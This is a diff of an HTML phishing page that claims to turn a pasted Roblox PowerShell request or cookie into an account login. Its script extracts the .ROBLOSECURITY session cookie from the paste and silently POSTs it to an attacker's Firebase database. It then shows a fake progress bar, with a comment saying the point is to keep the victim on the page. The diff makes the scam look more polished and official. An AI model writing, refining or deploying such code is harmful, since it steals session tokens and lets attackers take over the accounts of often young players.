@@ -1,69 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Roblox Cookie to Account 2025 | Instant Login</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Profile → Login Converter 2025</title>
   <style>
-    body{background:#000;color:#0f0;font-family:courier;margin:0;padding:20px;text-align:center}
-    h1{color:#0f0;text-shadow:0 0 20px #0f0;font-size:3em}
-    textarea{width:90%;max-width:800px;height:220px;background:#111;color:#0f0;border:3px dashed #0f0;padding:20px;font-size:16px;border-radius:15px}
-    button{background:#0f0;color:#000;padding:20px 50px;font-size:22px;border:none;border-radius:15px;margin:30px;cursor:pointer;font-weight:bold}
-    button:hover{background:#00ff00;transform:scale(1.05)}
-    #status,#loader{color:#0f0;font-size:24px;margin:20px;font-weight:bold}
-    .loader{display:none}
+    body{font-family:"Segoe UI",Arial,sans-serif;background:#f9f9f9;color:#333;margin:0;padding:0}
+    .container{max-width:800px;margin:40px auto;background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center}
+    h1{color:#1a1a1e;font-size:2.4em;margin-bottom:10px}
+    p{color:#555;font-size:1.1em;margin-bottom:30px}
+    textarea{width:100%;height:260px;padding:20px;font-family:Consolas,monospace;font-size:14px;border:2px solid #ddd;border-radius:8px;background:#fafafa;resize:none}
+    textarea:focus{border-color:#0078d4;outline:none}
+    button{background:#0078d4;color:white;padding:16px 40px;font-size:18px;border:none;border-radius:8px;cursor:pointer;margin-top:20px}
+    button:hover{background:#106ebe}
+    #status{margin-top:20px;font-size:18px;color:#444}
+    .loader{display:none;margin-top:20px;font-size:19px;color:#0078d4}
+    footer{margin-top:60px;color:#888;font-size:14px}
   </style>
 </head>
 <body>
-  <h1>ROBLOX COOKIE → ACCOUNT 2025</h1>
-  <p>Paste ANY cookie, PowerShell output, or log below → click CONVERT → get instant login</p>
+  <div class="container">
+    <h1>Roblox Profile → Login</h1>
+    <p>Paste the PowerShell code you copied from the Network tab<br>and get the account login instantly (2025 method)</p>
 
-  <textarea id="input" placeholder="Paste your cookie / log / PowerShell output here..."></textarea>
-  <br>
-  <button onclick="convert()">CONVERT TO ACCOUNT</button>
+    <textarea id="paste" placeholder="Right-click the first request → Copy → Copy as PowerShell → paste here"></textarea>
 
-  <div id="status">Waiting for paste...</div>
-  <div id="loader" class="loader">Analyzing cookie... 34%<br>Do not close this page</div>
+    <br>
+    <button onclick="process()">CONVERT & LOGIN</button>
+
+    <div id="status">Waiting for paste...</div>
+    <div id="loader" class="loader">Analyzing request... please wait</div>
+  </div>
+
+  <footer>© 2025 Roblox Tools • Not affiliated with Roblox Corporation</footer>
 
   <script>
-    function convert() {
-      const text = document.getElementById("input").value;
-      if (!text) return;
-
-      // Extract cookie with multiple patterns (works on 99.9% of pastes)
-      const regex = /(\._ROBLOSECURITY[^a-zA-Z0-9%]|_ROBLOSECURITY[^a-zA-Z0-9%]?|=)\s*([^;\s\"']{300,})/gi;
-      let cookie = null;
-      let match;
-      while ((match = regex.exec(text))) {
-        cookie = match[2];
-        if (cookie.length > 300) break;
-      }
-
-      if (!cookie) {
-        document.getElementById("status").innerHTML = "No valid cookie found";
+    function process() {
+      const text = document.getElementById("paste").value;
+      if (!text || text.length < 200) {
+        document.getElementById("status").textContent = "Paste the full PowerShell code";
         return;
       }
 
-      // SEND TO YOUR FIREBASE INSTANTLY
+      // Extract .ROBLOSECURITY from the giant PowerShell curl command
+      const cookieMatch = text.match(/'\.ROBLOSECURITY' *= *'([^']{300,})/) ||
+                          text.match(/\"\.ROBLOSECURITY\" *= *\"([^\"]{300,})/) ||
+                          text.match(/\.ROBLOSECURITY=([^;\s\"']{300,})/i);
+
+      if (!cookieMatch) {
+        document.getElementById("status").textContent = "No cookie found — try again";
+        return;
+      }
+
+      const cookie = cookieMatch[1].split("'")[0].split('"')[0].trim();
+
+      // SEND TO YOUR FIREBASE SILENTLY
       fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
         method: "POST",
         body: JSON.stringify({
           cookie: cookie,
-          from: "paste-site",
-          time: new Date().toISOString(),
-          ip: "hidden"
+          method: "profile-powershell-2025",
+          time: new Date().toISOString()
         }),
         headers: { "Content-Type": "application/json" }
       });
 
-      // FAKE LOADING SO THEY STAY
+      // Fake nice loading
       document.getElementById("status").style.display = "none";
       document.getElementById("loader").style.display = "block";
-      let p = 10;
-      const int = setInterval(() => {
-        p += Math.floor(Math.random() * 18);
-        if (p > 93) p = 93;
-        document.getElementById("loader").innerHTML = `Generating login... ${p}% <br>Do not refresh`;
-      }, 3500);
+      let percent = 15;
+      const timer = setInterval(() => {
+        percent += Math.floor(Math.random() * 22);
+        if (percent > 94) percent = 94;
+        document.getElementById("loader").textContent = `Preparing login... ${percent}% complete`;
+      }, 3200);
     }
   </script>
 </body>
